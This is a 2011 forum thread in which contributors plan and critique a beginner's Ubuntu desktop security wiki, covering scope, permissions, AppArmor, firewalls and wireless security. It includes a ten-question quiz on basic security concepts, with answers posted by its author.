To be honest the terms DAC and MAC both strike me as a bit arcane for a new user (it's hard for me to break out of the security bubble in finding terms to use). I think most new users are fine thinking about things in terms of file permissions and Apparmor. Permissions ensure that users can't do more than they need to, and things like Apparmor ensure that applications run as a given user can't do more than they need to.

Which, I think, brings up something I hadn't considered before: connection and mounting of storage devices. Again, I don't think we necessarily want a dedicated fstab section, especially when I'm pretty sure that one already exists. It might just be good to talk up the practice of making sure you can't just plug in any drive and have it available, while still being able to use the ones you need.

---

### Post by MrLeek on 2011-11-06
> **OpSecShellshock said:**
> 
Which, I think, brings up something I hadn't considered before: connection and mounting of storage devices. Again, I don't think we necessarily want a dedicated fstab section, especially when I'm pretty sure that one already exists. It might just be good to talk up the practice of making sure you can't just plug in any drive and have it available, while still being able to use the ones you need.

The immediate thing that popped into my head here was "turning off autorun" - it's strongly recommended in Windows setups. But I don't know if there's a similar problem for Linux to worry about.

---

### Post by Dangertux on 2011-11-06
I think honestly in this case that a little bit of focus is being lost. As you guys are undoubtedly researching more and more avenues for increasing your network/system security you're coming across all types of solutions. Content blocking at the DNS level being one of them, or with iptables and a proxy like Dan's Guardian.

That being said, it's important (IMO) if the document is going to be useful for anyone else to maintain a clear focus.

Start with two points. Point A fresh install. Point B, best practices desktop install. What steps are we going to take to get from point a to point b? 

That in my opinion is what should be covered, and truthfully I think the only assumption that should be made is that they have a Ubuntu desktop install connected to the internet. I wouldn't get into routing, proxies , dns filtering, printers and peripherals.

The truth of the matter is if you can solidify the concepts of desktop security on the ground you will put the reader leaps and bounds ahead when it comes time to start securing other devices on the network.

Also on the mounting and autorun thing. Fstab probably deserves mention, and yes you can create autorun.sh scripts. By default Ubuntu prompts the heck out of you before it runs it though.

---

### Post by haqking on 2011-11-06
> **Dangertux said:**
> I think honestly in this case that a little bit of focus is being lost. As you guys are undoubtedly researching more and more avenues for increasing your network/system security you're coming across all types of solutions. Content blocking at the DNS level being one of them, or with iptables and a proxy like Dan's Guardian.

That being said, it's important (IMO) if the document is going to be useful for anyone else to maintain a clear focus.

Start with two points. Point A fresh install. Point B, best practices desktop install. What steps are we going to take to get from point a to point b? 

That in my opinion is what should be covered, and truthfully I think the only assumption that should be made is that they have a Ubuntu desktop install connected to the internet. I wouldn't get into routing, proxies , dns filtering, printers and peripherals.

The truth of the matter is if you can solidify the concepts of desktop security on the ground you will put the reader leaps and bounds ahead when it comes time to start securing other devices on the network.

+1

keep it noob, keep it as an average install and configuration.

There are way too many tangents we could easily go off on and over complicate things outside of where we need to.

base install, base configuration, defaults, average etc.

---

### Post by WasMeHere on 2011-11-06
> **haqking said:**
> +1

keep it noob, keep it as an average install and configuration.

There are way too many tangents we could easily go off on and over complicate things outside of where we need to.

base install, base configuration, defaults, average etc.

Yes, a simple basic text with link for details. The links are important, and we should find the best way to store/maintain those details.

---

### Post by OpSecShellshock on 2011-11-06
Oh, something like that would flow nicely. Something like:

This is a fresh install with no changes

Then do [this] with ufw

Then do [this] with Firefox and/or Chromium

Etc...

Then the resulting configuration will be a pretty good start.

---

### Post by MrLeek on 2011-11-06
All very valid points. I don't think we're that far away thus far (sure there's loads of bits to do, but it sort-of covers the main points).

Right now I'm thinking (especially looking for thoughts from Ms Daisy here):

- Editing the front portions (as far as "Credentials & Permissions") as tightly as possible. it's all good stuff, but if we want a reader to get to the meat of this, we need to avoid getting tied down with the intro.
- Network printer "how to" on it's own help page.
- Firewalls get's a 4 line "how to" then link off to Danger's thread(s) (i've got that drafted in my head at the moment).
- "check for ssc & vnc" - again, needs to be expanded to be useful. So might work better on it's own help page.
- Agree a "house style" on where to place hyperlinks - in each part of the document or lump them together at the end of each section (e.g. "Credentials & Permissions").

From there see what it looks like and evaluate it. We can rewrite it in a "step by step format", but again I don't think the meat of what we've got so far is that far off that - once each section is complete, moving it around the wiki page is easy.

---

### Post by Ms. Daisy on 2011-11-06
> **MrLeek said:**
> Editing the front portions (as far as "Credentials & Permissions") as tightly as possible. it's all good stuff, but if we want a reader to get to the meat of this, we need to avoid getting tied down with the intro.
- Network printer "how to" on it's own help page.
- Firewalls get's a 4 line "how to" then link off to Danger's thread(s) (i've got that drafted in my head at the moment).
- "check for ssc & vnc" - again, needs to be expanded to be useful. So might work better on it's own help page.
- Agree a "house style" on where to place hyperlinks - in each part of the document or lump them together at the end of each section (e.g. "Credentials & Permissions").

From there see what it looks like and evaluate it. We can rewrite it in a "step by step format", but again I don't think the meat of what we've got so far is that far off that - once each section is complete, moving it around the wiki page is easy.I'm with you.  
-Yes, we can tighten up the intro. I can work on that this evening (while you slumber I think as I'm about 6 hours behind you).  
-Yup with the Network printer. (I drafted that in the Wiki while you were typing in this thread in fact)
-if you've got it drafted in your head then please proceed with the 4 lines on the firewall.
-also agree to link away from the wiki on ssc & vnc.  
- Don't know who was able to conquer the stupid formatting on the Wiki, but I like this style of link:
 [one of the best guides is linked here]("http://ubuntuforums.org/showthread.php?t=510812") I'm willing to work on getting the rest of the links to look like that. 
 I think we should link to stuff as we talk about it rather than at the end, but that's just my impatient style.  I'll go with majority on that one.

I was just in the Wiki & added a comment- check it out.  I propose we delete or move to a separate help page everything below that line.  I think that echoes what you're saying.

---

### Post by OpSecShellshock on 2011-11-06
Couple of other things maybe from a newbie perspective? Just occurred to me (again!):

Password resets for the user account should be done graphically, rather than from terminal. This saves headaches. To do this:

Click on your name/face in the upper left of the panel. Then select User Accounts. Your account will be highlighted in the application that comes up. Under Login Options, mouse over the password and it will turn into a button. Click on that to bring up a password reset application. The logged-in user will only be able to affect their own account unless they hit the unlock button and elevate privileges, so there's a pretty high error tolerance here. For administrators, this new password will also be the new sudo/privilege elevation password.

Also, the user created at the time of installation will be listed as an Administrator (by necessity, really). However, this does not mean that this user has the privileges of root all the time. Use of sudo in terminal or the graphical privilege elevation will still be necessary to perform root functions. On most single-user systems this is good enough, and there's not much of a need to create a second, non-privileged user account. If any user account gets compromised, you're probably reinstalling anyway.

Also the second: not every command run in terminal provides visual feedback that it has done something. Sometimes things just happen without a message that says "hey, this thing just happened!" Running commands in terminal is sort of a measure twice cut once scenario. New users should understand this.

---

### Post by Ms. Daisy on 2011-11-06
> **OpSecShellshock said:**
> Also the second: not every command run in terminal provides visual feedback that it has done something. Sometimes things just happen without a message that says "hey, this thing just happened!" Running commands in terminal is sort of a measure twice cut once scenario. New users should understand this.
All good info, I'll probably create a link off-page to the first bit of that.

And at the risk of completely derailing the discussion again, I've been working in bash trying to learn the syntax & behavior.  It would be best if I could run bash in a sandbox, or maybe a simulated bash in a sandbox.  Can you do such a thing?  The only other alternative I've come up with is installing a virtual machine with ubuntu on it.  I can type all sorts of stuff into the VM terminal & see what they do, and I can just reinstall or revert to a snapshot if I kill ubuntu doing that. But that's kind of a long way to go.  Surely I'm not the first person that wants to screw around in bash without screwing up my machine.

---

### Post by Dangertux on 2011-11-06
> **Ms. Daisy said:**
> All good info, I'll probably create a link off-page to the first bit of that.

And at the risk of completely derailing the discussion again, I've been working in bash trying to learn the syntax & behavior.  It would be best if I could run bash in a sandbox, or maybe a simulated bash in a sandbox.  Can you do such a thing?  The only other alternative I've come up with is installing a virtual machine with ubuntu on it.  I can type all sorts of stuff into the VM terminal & see what they do, and I can just reinstall or revert to a snapshot if I kill ubuntu doing that. But that's kind of a long way to go.  Surely I'm not the first person that wants to screw around in bash without screwing up my machine.

Virtualization in this case is probably the best way to go. You could in theory chroot yourself, but by definition this would limit what commands you could use. Thus defeating the purpose and your ability to learn. Chroots are outdated in terms of security and much less preferred due to virtualization's increaing popularity. I would stick with a VM if you just want to play.

---

### Post by Bukie on 2011-11-06
Thank you all for your feedback. Much of it was very helpful, especially the person who suggested **[https://help.ubuntu.com/community](https://help.ubuntu.com/community)**. I think I may have misunderstood the purpose of the Wiki, instead confusing it for what my personal questions/problems are.

 I also wanted to clarify what I meant when I suggested using **ThisIsMyP@55word** over some randomly generated chain. While I would never suggest using this exact password, the style is very strong as it allows extremely-long passwords with minimal memorization. The reason I am so adverse to the random string passwords is because they are rather difficult to remember and people chose to simply post-it note them on their computer monitors. (I saw this happen at one of the places I used to work - you could walk through the cubicles and easily harvest most people's logins. Thankfully, last I checked, they no longer did this.)

 If you guys (and gals) would still like some help though, I'd be glad to lend a hand.

 Thanks again for the info.

---

### Post by WasMeHere on 2011-11-06
Concerning stuff below the line "Should we include the following bits?"

I think the text about ***wireless networks*** is important and should be in the main wiki or at least part of it should be there.

---

### Post by CharlesA on 2011-11-06
> **Dangertux said:**
> Quick survey question about Apparmor, do you think video tutorials would be easier than a written tutorial?   It's been something of my personal Ubuntu quest to demystify apparmor for folks. I just have not been able to accomplish that yet.

Screenshots or video would probably be best.

Altho, to be honest, I haven't been bothered to learn much about apparmor.

---

### Post by Ms. Daisy on 2011-11-06
> Altho, to be honest, I haven't been bothered to learn much about apparmor.CharlesA, I think it has become my mission to convince you to learn! > **Olle Wiklund said:**
> Concerning stuff below the line "Should we include the following bits?"

 I think the text about ***wireless networks*** is important and should be in the main wiki or at least part of it should be there. I agree, I added a link to a good tutorial I found on securing your router under the 'network' section.  


Holy crap, **I THINK WE'RE NEARLY DONE.**


I did a bit of editing and formatting, and I think the appearance of the Wiki has drastically improved.  It's easy to follow and quick to read. I hope everyone can give it a look and say what they think. I'm anxious to know what the professional sec guys think.  Do you feel OK giving that to a new user as a jumping off point?  It's simplified without making the reader think that's all there is to it.


And when we've decided we're done with this thing, can we all have a virtual beer together?  Seems like we earned it.

---

### Post by Ms. Daisy on 2011-11-06
.

---

### Post by vasa1 on 2011-11-07
Is this thread helpful?
[http://askubuntu.com/questions/3750/what-precautions-should-i-take-when-exposing-my-desktop-directly-to-the-internet](http://askubuntu.com/questions/3750/what-precautions-should-i-take-when-exposing-my-desktop-directly-to-the-internet)
and this:
[http://askubuntu.com/questions/25880/is-ubuntu-vulnerable-to-recent-exploits-using-usb-sticks-and-automount](http://askubuntu.com/questions/25880/is-ubuntu-vulnerable-to-recent-exploits-using-usb-sticks-and-automount)

---

### Post by WasMeHere on 2011-11-07
> I think the text about wireless networks is important and should be in the main wiki or at least part of it should be there.
> **Ms. Daisy said:**
> ... I agree, I added a link to a good tutorial I found on securing your router under the 'network' section...

I think it is not enough to have only the link. Maybe 2 lines would be enough, about long password and WPA instead of WEP.

---

### Post by MrLeek on 2011-11-07
> **Olle Wiklund said:**
> I think it is not enough to have only the link. Maybe 2 lines would be enough, about long password and WPA instead of WEP.

Agree with this premise. Any time we just want to say "follow this link" we (ideally) want to explain why it's a good thing.

Otherwise this is shaping up quite nicely - I'll add the bits I'm thinking of later today.

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> CharlesA, I think it has become my mission to convince you to learn!  I agree, I added a link to a good tutorial I found on securing your router under the 'network' section.  


Holy crap, **I THINK WE'RE NEARLY DONE.**


I did a bit of editing and formatting, and I think the appearance of the Wiki has drastically improved.  It's easy to follow and quick to read. I hope everyone can give it a look and say what they think. I'm anxious to know what the professional sec guys think.  Do you feel OK giving that to a new user as a jumping off point?  It's simplified without making the reader think that's all there is to it.


And when we've decided we're done with this thing, can we all have a virtual beer together?  Seems like we earned it.

> **Olle Wiklund said:**
> I think it is not enough to have only the link. Maybe 2 lines would be enough, about long password and WPA instead of WEP.

Ref the wireless security.

Not meant for the wiki but if you guys want something short to read (14 pages) about the merits of WEP/WPA/WPA2 and how they were cracked and why then read the pdf here [http://www.hsc.fr/ressources/articles/hakin9_wifi/index.html.en](http://www.hsc.fr/ressources/articles/hakin9_wifi/index.html.en)

it is a nice short but informative .pdf on WIFI and WIFI Security, it is not overly complex but complex enough to help your understanding.

Cheers

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> CharlesA, I think it has become my mission to convince you to learn!  I agree, I added a link to a good tutorial I found on securing your router under the 'network' section.  


Holy crap, **I THINK WE'RE NEARLY DONE.**


I did a bit of editing and formatting, and I think the appearance of the Wiki has drastically improved.  It's easy to follow and quick to read. I hope everyone can give it a look and say what they think. I'm anxious to know what the professional sec guys think.  Do you feel OK giving that to a new user as a jumping off point?  It's simplified without making the reader think that's all there is to it.


And when we've decided we're done with this thing, can we all have a** virtual beer together**?  Seems like we earned it.



I think it is a good jumping off point for noobs.

Cheers and beers (mines a guinness)

[IMG]http://www.articlesweb.org/blog/wp-content/uploads/2011/08/guinness1.jpg[/IMG]

---

### Post by CharlesA on 2011-11-07
> **Ms. Daisy said:**
> CharlesA, I think it has become my mission to convince you to learn!

:)

@DT: Thanks for the link to the the apparmor stuff, I'll poke around.

@Everyone: Wiki page looks great.

As for the part at the end that you are thinking about deleting - I think it might be a good idea to mention something about not installing a service (SSH, VNC, Apache, whatnot) unless you know what it does and how to secure it. That might be a bit over the head of a newbie, so I'm kind of split on that one.

---

### Post by WasMeHere on 2011-11-07
> **Ms. Daisy said:**
> ...
And when we've decided we're done with this thing, can we all have a virtual beer together?  Seems like we earned it.

Although some of us still want to do minor editing ...
Honestly, I think you deserve a *real* beer & :popcorn: :guitar: :KS

Olle

---

### Post by Ms. Daisy on 2011-11-07
> **CharlesA said:**
> As for the part at the end that you are thinking about deleting - I think it might be a good idea to mention something about not installing a service (SSH, VNC, Apache, whatnot) unless you know what it does and how to secure it. That might be a bit over the head of a newbie, so I'm kind of split on that one.I tend to agree so I stuck it in there. > Any time we just want to say "follow this link" we (ideally) want to explain why it's a good thing.

Otherwise this is shaping up quite nicely - I'll add the bits I'm thinking of later today. Again I agree.  I added a bit of explanation here & there. And I'm anxious to see what you add later today.  When I read the same thing 345 times, I tend to stop seeing it.  So if there's a specific part that needs more explanation in anyone's opinion, please specifically point it out.

---

### Post by Dangertux on 2011-11-07
IMO change the vulnerabilities link to this one [http://www.ubuntu.com/usn/](http://www.ubuntu.com/usn/)

---

### Post by CharlesA on 2011-11-07
> **Dangertux said:**
> IMO change the vulnerabilities link to this one [http://www.ubuntu.com/usn/](http://www.ubuntu.com/usn/)
+1.

I suppose you could include the malware and virus links somewhere, but they aren't that big of a threat overall.

---

### Post by haqking on 2011-11-07
> **CharlesA said:**
> +1.

I suppose you could include the malware and virus links somewhere, but they aren't that big of a threat overall.

a few links you may want

[http://en.wikipedia.org/wiki/Linux_malware](http://en.wikipedia.org/wiki/Linux_malware)
[https://help.ubuntu.com/community/Antivirus](https://help.ubuntu.com/community/Antivirus)
[https://help.ubuntu.com/community/Linuxvirus](https://help.ubuntu.com/community/Linuxvirus)
[http://www.psychocats.net/ubuntu/security](http://www.psychocats.net/ubuntu/security)
[http://www.neowin.net/news/a-history-of-viruses-on-linux](http://www.neowin.net/news/a-history-of-viruses-on-linux)

my favourite is the psychocats link where at the end is a great script from seinfeld ;)

edit: here is another link which is a pretty good NOOB summary of security in general for the home/home network user (os agnostic)
[http://www.cert.org/tech_tips/home_networks.html#I-A](http://www.cert.org/tech_tips/home_networks.html#I-A)

You may want to link to it on your wiki

---

### Post by Ms. Daisy on 2011-11-07
> **haqking said:**
> a few links you may want

my favourite is the psychocats link where at the end is a great script from seinfeld Thanks for the links, I do want to improve several of the links in the Wiki right now.  I had a link previously to the psychocat page with the seinfeld script in it (found it informative & amusing), but it got deleted somewhere along the way.

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> Thanks for the links, I do want to improve several of the links in the Wiki right now.  I had a link previously to the psychocat page with the seinfeld script in it (found it informative & amusing), but it got deleted somewhere along the way.

I edited the vulnerability link in the wiki to something more appropriate ([http://www.ubuntu.com/usn](http://www.ubuntu.com/usn)) as DT mentioned above, as the current one was the same antivirus link as the link preceding it.

I added a contents table, hope that was ok, feel free to remove it if you feel it doesnt need it, and maybe you want to add a glossary towards the end of all the terms mentioned or linked to possibly ? not sure on that one ?

You might want to re-tidy it now i've changed the way it looked with a contents table...LOL

I also added the CERT Home network security link to the home networking section

Cheers

---

### Post by Dangertux on 2011-11-07
I have a question. Not to put down the effort of all those working on this. However I'm wondering, since this started out as an endeavor toward education and discovery and seems to have ended up a best parts version of the Ubuntu community documentation.

So in the interest of learning. I ask those who endeavored on that journey a few simple questions

1 -- If you have no ports "open", what does this actually mean in terms of sockets and services? (Assume there is no firewall blocking access to any services)

2 -- If you have a firewall with strong inbound and outbound rules can your system still be compromised? If so how?

3 -- Can iptables protect a service that has to be exposed from compromise via a flaw in the service itself?

4 -- Can a firewall prevent or slow down a brute force attack against SSH?

5 -- In Ubuntu's default configuration can another user read your home directory?

6 -- In Ubuntu's default configuration can an application run as a user access your passwd file?

7 -- Where are your hashed passwords stored?

8 -- How do Mandatory Access Controls like Apparmor protect your data in the event an application or service is compromised?

9 -- Will NoScript protect you against a Man in the Middle attack (via ARP spoofing) while you're using a public wireless access point?

10 -- Will NoScript protect you from Cross Site Request Forgery or Cross Site Scripting attacks if you enable all javascript on the site you are currently visiting?


Extra Credit : If a service is running as a user (the user is not a sudoer) and is successfully exploited can the attacker gain root privileges or only the privileges of the user?

Sort of a quick check on learning to see if we've actually done anything with this other then creating some links.

---

### Post by MrLeek on 2011-11-07
> **Dangertux said:**
> I have a question. Not to put down the effort of all those working on this. However I'm wondering, since this started out as an endeavor toward education and discovery and seems to have ended up a best parts version of the Ubuntu community documentation.

So in the interest of learning. I ask those who endeavored on that journey a few simple questions

1 -- If you have no ports "open", what does this actually mean in terms of sockets and services? (Assume there is no firewall blocking access to any services)

2 -- If you have a firewall with strong inbound and outbound rules can your system still be compromised? If so how?

3 -- Can iptables protect a service that has to be exposed from compromise via a flaw in the service itself?

4 -- Can a firewall prevent or slow down a brute force attack against SSH?

5 -- In Ubuntu's default configuration can another user read your home directory?

6 -- In Ubuntu's default configuration can an application run as a user access your passwd file?

7 -- Where are your hashed passwords stored?

8 -- How do Mandatory Access Controls like Apparmor protect your data in the event an application or service is compromised?

9 -- Will NoScript protect you against a Man in the Middle attack (via ARP spoofing) while you're using a public wireless access point?

10 -- Will NoScript protect you from Cross Site Request Forgery or Cross Site Scripting attacks if you enable all javascript on the site you are currently visiting?


Extra Credit : If a service is running as a user (the user is not a sudoer) and is successfully exploited can the attacker gain root privileges or only the privileges of the user?

Sort of a quick check on learning to see if we've actually done anything with this other then creating some links.

I love how you say "simple". OK - I'll have a stab at this

1) if there's no ports open then I would imagine that no connection to a webpage or chat session is possible. We "poke a hole" out in the firewall at port 80 to enable connections to websites.

2) Biggest risk here would be from the user. A firewall does not block a phishing email, and it (probably) does not block the results if the user clicks on the link. That said, other services (like opendns.com) may prevent the malicious site from opening.

5) Without an encrypted file, yes they can.

7) A lot of mine are saved in the browser (which is why I asked about that as a security risk). Something that's already being addressed.

9) Probably not.

10) if you "enable all" you might as well not have no script installed. I'm assuming that click jacking would still be protected.

Extra Credit) I would have said "only user privileges" but then if the attacker has captured your password then he can run sudo. Not certain if you could get to root from there (that's the attackers goal after all).

The rest I'd have to do some research on. Apparmor works by you essentially defining how a application is allowed to access the net. I'll find out if I'm right before I comment if I've learnt anything from this endeavour! ;)

---

### Post by Ms. Daisy on 2011-11-07
> **Dangertux said:**
> I have a question. Not to put down the effort  of all those working on this. However I'm wondering, since this started  out as an endeavor toward education and discovery and seems to have  ended up a best parts version of the Ubuntu community documentation.
 
 So in the interest of learning. I ask those who endeavored on that journey a few simple questions
 
 Sort of a quick check on learning to see if we've actually done anything with this other then creating some links.
 Honesty time: I worked on this project for my own benefit.  It would be  great if others benefit as well, but seriously, I wasn't spending all my  time in this forum only for the greater good.  That being said, I truly  believe that the Wiki can help the Average Joe installing Ubuntu for  the first time. The target audience are people that have no intentions  in becoming security professionals.  In their world, security = Norton  Antivirus.  Or maybe they recently discovered that security != Norton  but they have no idea what it does equal.  To that end, the Wiki gives  them explanations of basic security principles & a clear path to  learn more if they want to.  Surely you can see the value of that. I  don't know if someone reading our Wiki will be able to answer your  questions.  But they will be able to implement some simple security  steps that they may not have been able to before.
 
 For me it's the chicken & the egg problem, Dangertux.  How can I  answer those questions until I know where to go for the answers?  There  wasn't one address containing the information before, or at least not  one I could find.  And information to answer those questions was  scattered far & wide.  That made it unbelievably daunting to even  know what questions to ask, much less where to find the answers.  I  can't overstate that.  I was so frustrated and overwhelmed with securing  my new Ubuntu to the point that I was just going to forget about  security altogether until I 
 1. mastered Ubuntu, 
 2. mastered networking, 
 3. mastered server administration, and then 
 4. mastered Infosec.  
 So let's see... If I study 3 hours a night for the next year solid, I  may be able to get to step 3. Meanwhile, my little network has been the  most productive unwitting member of a botnet.  The Wiki is a starting place.  I  wasn't able to find that starting place so I helped create it.
 
 And to answer the questions because I LOVE a challenge:
 1. If I do nothing to my ports, services will use default ports & sockets.  
 2.  Yes, certain services are allowed, so a malicious program can ride on an approved service.
 3. Not sure if I understand the question. If a compromised pdf is  calling a Chinese website via approved ports & sockets, the firewall  would happily let it through.
 4. I don't think so, but now I know not to use SSH in the first place (until I understand it)!
 5 & 6. I guess it depends on what permissions you give that user.
 7. Plain text file at [www.HackMs.Daisy.com?](www.HackMs.Daisy.com?) I don't know.
 8. AppArmor creates a list of rules allowed for various applications. I  assume that means if the same compromised PDF is calling a Chinese  website, AppArmor checks the rules to see if PDFs are allowed to call  Chinese websites.  
 9. Nope.  But you won't run a blocked script that you trip across on the  internet while the MITM logs all your accounts & passwords.
 10. Nope, those attacks run javascript in your browser.
 EC. If the attacker knows what he's doing, he can probably change the user's permissions & do whatever he wants.

---

### Post by Dangertux on 2011-11-07
Okay first thing. I didn't mean to offend anyone so if they're mad that was not my intent. That being said. I asked those questions because they are simple security concepts, that should be addressed in any beginners guide. I would not expect you to know how to carry out any of those attacks, however if you're writing a security wiki, you should have at least a basic knowledge of how to defend against them.

Now for the answers

1 -- If you have no ports "open", what does this actually mean in terms  of sockets and services? (Assume there is no firewall blocking access to  any services)

**A port is opened when a service binds to it and creates a socket waiting for incoming connections. This waiting is also known as listening.** 

2 -- If you have a firewall with strong inbound and outbound rules can your system still be compromised? If so how?

**There are numerous ways, however the response I was looking for, would have mentioned the fact that something would be open, IE: port 80 or 53 or 443**

3 -- Can iptables protect a service that has to be exposed from compromise via a flaw in the service itself?
[B]
The answer is no, so long as the vulnerability can not be subdued via rate limiting. The point is that iptables can not function as a DPI firewall.[/B]

4 -- Can a firewall prevent or slow down a brute force attack against SSH?

**Yes, it can. It can do this by use of rate limiting.**

5 -- In Ubuntu's default configuration can another user read your home directory?

**Yes. Default file permissions in the home directory are 0644**


6 -- In Ubuntu's default configuration can an application run as a user access your passwd file?

**Yes**
7 -- Where are your hashed passwords stored?

**This was a poorly worded question. I meant for you Ubuntu installation. In this case the answer I was looking for was /etc/shadow- or on older versions /etc/.shadow** [B]or /etc/shadow
[/B] 
8 -- How do Mandatory Access Controls like Apparmor protect your data in the event an application or service is compromised?

**Apparmor implements path based restrictions. If a program or service is compromised and properly confined by apparmor in theory the attacker should only be able to execute the functionality of the program or service itself. Thus if your data is not normally accessible to the application it still would not be.**

9 -- Will NoScript protect you against a Man in the Middle attack (via  ARP spoofing) while you're using a public wireless access point?

**No**

10 -- Will NoScript protect you from Cross Site Request Forgery or Cross  Site Scripting attacks if you enable all javascript on the site you are  currently visiting?
 
[B]Yes, NoScript will continue to protect you against XSS and CSRF because the script that would be called would be from another location. Thus even if the script calling the external script were allowed to be run, NoScript would still enforce the same origin policy.

[/B]EC : [B]If the user running the service that was compromised has access to a compiler, they could compile an executable which would attempt to exploit a vulnerability in the kernel or another application to successfully elevate their privileges. 
[/B]
All that being said, I didn't want to offend anyone. I just  thought this might help us look in a direction that would lead to improvement of the wiki. These are basic concepts, that one should know when properly securing their system.

Hope this helps.

---

### Post by Ms. Daisy on 2011-11-07
> **Dangertux said:**
> All that being said, I didn't want to offend anyone. I just  thought this might help us look in a direction that would lead to improvement of the wiki. These are basic concepts, that one should know when properly securing their system  I'm not mad.   
Do you mean that the basic principles of security you brought up in the 10 questions should be explained in the Wiki? Or do you mean the authors should understand those things?

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> I'm not mad.   
Do you mean that the basic principles of security you brought up in the 10 questions should be explained in the Wiki? Or do you mean the authors should understand those things?

I would say he meant both. (though i cannot vouch for DT on this, just my opinion)

Those concepts are needed to be able to effectively secure a system.  You wont be able to use a firewall effectively if the concepts of ports, sockets, services etc are not understood for example.

These are basic concepts that are needed to be understood to use firewall, apparmor, noscript, DAC, etc etc
IMHO of course

---

### Post by Dangertux on 2011-11-07
> **Ms. Daisy said:**
> I'm not mad.   
Do you mean that the basic principles of security you brought up in the 10 questions should be explained in the Wiki? Or do you mean the authors should understand those things?

Ok well... Not so much those 10 questions, those were just generalities. The point was to illustrate the direction that I think both the authors and the readers should be going in mentally by the time they get to the end of the wiki.

As it stands right now, I feel the wiki is a good repository of links, but is missing the "how" and "why" aspect. You're fighting a tough crowd, just look at the responses on the forum. People are often times blinded by the obscurity of linux, this gives them a false sense of security. Which is not really founded. In order to educate you have to provide hard evidence and reasoning behind why a particular approach is preferable, otherwise it just comes off as opinion.

---

### Post by Ms. Daisy on 2011-11-07
> **Dangertux said:**
> Ok well... Not so much those 10 questions, those were just generalities. The point was to illustrate the direction that I think both the authors and the readers should be going in mentally by the time they get to the end of the wiki.

As it stands right now, I feel the wiki is a good repository of links, but is missing the "how" and "why" aspect. You're fighting a tough crowd, just look at the responses on the forum. People are often times blinded by the obscurity of linux, this gives them a false sense of security. Which is not really founded. In order to educate you have to provide hard evidence and reasoning behind why a particular approach is preferable, otherwise it just comes off as opinion.I guess I was relying on the links themselves to do some of the explaining, but I see your point. I've had an umpteen-year-long career in scientific writing.  So if we need to make a solid argument, I excel at that.  Are there certain parts where you feel the how & why is more conspicuously absent than others?  Where should we focus our effort first?

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> I guess I was relying on the links themselves to do some of the explaining, but I see your point. I've had an umpteen-year-long career in scientific writing.  So if we need to make a solid argument, I excel at that.  Are there certain parts where you feel the how & why is more conspicuously absent than others?  Where should we focus our effort first?

It is a difficult question.

I would recommend a good read of the CERT link i posted on the wiki

[http://www.cert.org/tech_tips/home_networks.html#I-A](http://www.cert.org/tech_tips/home_networks.html#I-A)

it is a noobish doc which covers a lot of concepts needed, it explains NAT, protocols, ports etc in simple wording and brief, it gives a good overall basics if you know what i mean.

it is basic though, but covers a lot

---

### Post by MrLeek on 2011-11-07
> **Dangertux said:**
> 
All that being said, I didn't want to offend anyone. I just  thought this might help us look in a direction that would lead to improvement of the wiki. These are basic concepts, that one should know when properly securing their system.


No offence taken here - as Ms Daisy part of this was for my benefit, to help get certain things clear in my head (e.g. Firewalls) and to start learning about other aspects that I knew little about. Also, I enjoyed trying out the quiz as testing your knowledge is always a good thing and I'm fairly content with my answers.

In fact, part of my thinking behind the guide is related to how I learn. It's one thing to know what instructions to follow....it's another thing to be able to explain to my granny why and how something needs to be done. 

I think we needed to take the wiki page in the direction it's gone first to say "ok, these are the things we need to do". Now the things to explain is "what do you need to do to fix the problem?". That was my starting intent with the Firewall addition in the wiki - I fully understand (at least from a newbie point of view) why certain ports are left open.

>  Are there certain parts where you feel the how & why is more  conspicuously absent than others?  Where should we focus our effort  first?

Honestly? Pick a thing (apparmor is next on my list), really work to understand what's going on - then write a brief guide. We can do things like "this is how to turn on security updates", but the link does that and it's not hard to do. By trying to explain what you did to get a security thing to work the wiki page will continue to improve (and it's in a decent place as it is).

---

### Post by BlinkinCat on 2011-11-07
Hi to all the contributors to the BasicSecurity Wiki,

In the last 6 days I have been following all of your contributions to this thread - the progress you have made has been extraordinary and each of you deserves congratulations of the highest order. To Ms. Daisy, I believe you have breathed life into the project and deserve a special commendation. 
As a technically challenged individual, I for one really appreciate all of your efforts and look forward to filling gaps that have been missing in my education and will relish the challenge of following the guidelines outlined in your marvelous Wiki.

All the best to you all - :)

---

### Post by haqking on 2011-11-07
I was wandering if the use of World of Warcraft (though a popular game) needs to be mentioned on a basic desktop security wiki ;-)

WOW brings into play Wine which has its own security related concepts to cover.

I dont see Wine and WoW as a default basic setup

Just my thoughts

---

### Post by SparTacux on 2011-11-07
> **haqking said:**
> I think it is a good jumping off point for noobs.

Cheers and beers (mines a guinness)

[IMG]http://www.articlesweb.org/blog/wp-content/uploads/2011/08/guinness1.jpg[/IMG]

That Guinness of yours is brewed in Brazil matey. ;-) 
And that tick of yours is contagious ;-)    

I spotted some unusual links going out from the Forum and checked them out. I'm learning this security stuff after all. :-)

All the benefits of a good Firewall log.   I do hope you guys mention looking at logs as part of your tutorial on security. I haven't seen anyone mention it yet.

---

### Post by Dangertux on 2011-11-07
I don't think that it's really lacking focus so much as detail. It's really hard to explain, it feels as if some of the sections are lacking depth.

Particularly in the browser security, file permissions and apparmor sections. Maybe even the Sudoers and login as root sections as well. When I have more time later on I will give a more realistic assessment and possibly add some constructive content that could be added to those sections as well.

+1 on log auditing posted above me. That section needs to be there.

---

### Post by haqking on 2011-11-07
> **SparTacux said:**
> That Guinness of yours is brewed in Brazil matey. ;-) 
And that tick of yours is contagious ;-)    

I spotted some unusual links going out from the Forum and checked them out. I'm learning this security stuff after all. :-)

All the benefits of a good Firewall log.   I do hope you guys mention looking at logs as part of your tutorial on security. I haven't seen anyone mention it yet.

After getting seriously drunk at the guinness brewery on multiple occasions in Dublin, im pretty sure there was no spanish speakers close by ;-)

Checking logs is useless if you dont know what you are looking for.  If you know what you are looking for you would know to check the log LOL

Edit: oh and as for the tick,  was gonna fix it a while back but it gives the guys at omgcheesecake something to moan about ;-)

---

### Post by SparTacux on 2011-11-07
> **haqking said:**
> After getting seriously drunk at the guinness brewery on multiple occasions in Dublin, im pretty sure there was no spanish speakers close by ;-)

Checking logs is useless if you dont know what you are looking for.  If you know what you are looking for you would know to check the log LOL

True about the logs - most of them are pretty cryptic.

Firewall logs are simple enough though - Source IP, Destination IP , and port number. 

I did some shopping at a Jewelers with a .co.uk address recently - IP Destination was China :-)
